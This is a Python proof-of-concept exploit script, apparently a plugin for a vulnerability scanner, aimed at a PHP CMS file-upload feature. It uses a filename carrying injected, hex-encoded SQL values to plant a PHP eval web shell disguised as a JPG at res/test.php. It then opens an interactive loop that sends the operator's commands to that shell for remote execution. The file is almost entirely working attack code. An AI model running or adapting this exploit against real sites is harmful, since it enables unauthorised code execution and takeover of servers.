from lib.core.data import target
import urlparse
import requests
import re

def poc():
	try:
		if  not target.url.endswith("index.php"):
			print("[*] Please make sure the url end with 'index.php'")
			exit()

		phpsession = requests.get(target.url).cookies['PHPSESSION']
		cookies = {'PHPSESSION': phpsession}
		password = raw_input("[*] Please enter the shell-password:")
		phpshell = "<?php eval($_POST['" + password + "']);?>"
		# phpshell = "<?php phpinfo(); ?>"
		url1 = target.url + "?c=upload&f=save"
		files1 = [('upfile', ("1','r7ip15ijku7jeu1s1qqnvo9gj0','30',''),('1',0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,'',0x7265732f746573742e706870,'1495536080','2.jpg",phpshell, 'image/jpg')),
		]
		r = requests.post(url1, files=files1, cookies=cookies)
		response = r.text
		id = re.search('"id":"(\d+)"', response, re.S).group(1)
		id = int(id) + 1

		url2 = target.url + '?c=upload&f=replace&oldid=%d' % (id)
		files2 = [
		    ('upfile',
		     ('1.jpg', phpshell, 'image/jpg')),
		]
		r = requests.post(url2, files=files2, cookies=cookies)

		shell = target.url.replace("/index.php","/res/test.php")
		print "[*] The shell url: " + shell
		print "[*] The shell password: " + password

		flag = 1
		while flag:
			try:
				command = raw_input("[*] input the command:")
				if command != "exit":
					payload = {
						password : command
					}
					r = requests.post(shell, data=payload)
					print r.text
				else:
					flag = 0
			except EOFError as e:
				print "[*] type 'exit' to quit"
				pass

		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
	except KeyError as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
